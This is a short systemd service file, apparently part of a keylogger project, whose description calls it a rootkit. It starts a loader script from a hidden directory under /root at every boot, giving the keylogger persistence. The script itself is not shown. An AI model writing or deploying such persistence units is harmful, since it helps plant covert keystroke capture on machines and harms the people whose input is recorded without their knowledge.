# not_klog/key-logger/not_a_key_logger.service
[Unit]
Description=this is a damn rootkit

[Service]
Type=oneshot
ExecStart=/root/.not_keylogger/klg_load.sh

[Install]
WantedBy=multi-user.target
